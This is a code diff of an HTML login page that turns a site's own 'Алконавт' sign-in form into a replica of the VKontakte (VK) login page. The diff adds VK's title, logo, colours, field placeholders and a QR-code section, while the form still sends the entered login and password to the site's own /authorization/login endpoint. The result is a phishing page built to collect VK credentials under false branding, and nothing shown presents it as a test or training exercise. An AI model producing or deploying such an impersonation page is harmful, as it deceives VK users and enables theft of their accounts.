@@ -1,69 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Алконавт</title>
+    <title>VK Вход</title>
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background-image: "";
-            height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background-image: url('/public/bg.jpg');
-    background-size: cover;
-    background-position: center; 
-    background-repeat: no-repeat; 
+            background-color: #f5f5f5; /* Цвет фона страницы */
+            padding: 20px;
         }
 
         .form-container {
-            background-color: #fff;
+            background-color: #ffffff; /* Белый фон для формы */
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 400px; /* Ширина формы */
+            width: 100%;
         }
 
         .form-container h1 {
-            color: #06b543;
+            font-size: 24px;
+            color: #000000; /* Черный цвет текста */
             margin-bottom: 20px;
+            text-align: center;
         }
 
         .btn-custom {
-            background-color: #06b543;
-            color: #fff;
+            background-color: #4986cc; /* Цвет кнопки входа синий, как на VK */
+            color: #ffffff;
+            border: none;
+            padding: 10px;
         }
 
         .btn-custom:hover {
-            background-color: #06b543;
+            background-color: #3578a8; /* Немного темнее при наведении */
+        }
+
+        .form-image {
+            display: block;
+            margin: 0 auto 20px; /* Центрирование логотипа */
+            max-width: 100px; /* Размер логотипа */
+        }
+
+        .form-label {
+            color: #6a737f; /* Серый цвет для меток полей */
+        }
+
+        .form-control {
+            border: 1px solid #d3d9de; /* Легкий серый цвет для границ полей */
+        }
+
+        .qr-section {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .qr-section img {
+            max-width: 100px; /* Размер QR-кода */
+        }
+
+        .qr-section p {
+            color: #000000; /* Цвет текста под QR-кодом */
         }
     </style>
 </head>
 <body>
 
 <div class="form-container">
-    <h1 class="text-center">Добро пожаловать в Алконавт</h1>
-    <p class="text-center mb-4">Вход</p>
+    <img src="VK_Compact_Logo_(2021-present).svg.png" alt="VK Logo" class="form-image"> <!-- Логотип VK -->
+    <h1>Вход ВКонтакте</h1>
     <form action="/authorization/login" method="POST">
         <div class="mb-3">
-            <label for="login" class="form-label">Логин 🥃</label>
-            <input type="text" class="form-control" id="login" name="login" placeholder="введите ваш логин" required>
+            <label for="login" class="form-label">Логин</label>
+            <input type="text" class="form-control" id="login" name="login" placeholder="Телефон или почта" required>
         </div>
         <div class="mb-3">
-            <label for="password" class="form-label">Пароль 🧊</label>
-            <input type="password" class="form-control" id="password" name="password" placeholder="введите ваш пар-р-р-роль" required>
+            <label for="password" class="form-label">Пароль</label>
+            <input type="password" class="form-control" id="password" name="password" placeholder="Пароль" required>
         </div>
-        <button type="submit" class="btn btn-custom w-100">Log In</button>
+        <div class="form-check mb-3">
+            <input type="checkbox" class="form-check-input" id="rememberMe">
+            <label class="form-check-label" for="rememberMe">Сохранить вход</label>
+        </div>
+        <button type="submit" class="btn btn-custom w-100">Войти</button>
     </form>
+
+    <div class="qr-section">
+        <p>Быстрый вход по QR-коду</p>
+        <img src="sample-qr-code-icon-png.webp" alt="QR Code"> 
+        <p><a href="#">Подробнее</a></p>
+    </div>
 </div>
 
-<!-- Bootstrap JS (for optional interactivity) -->
+<!-- Bootstrap JS -->
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
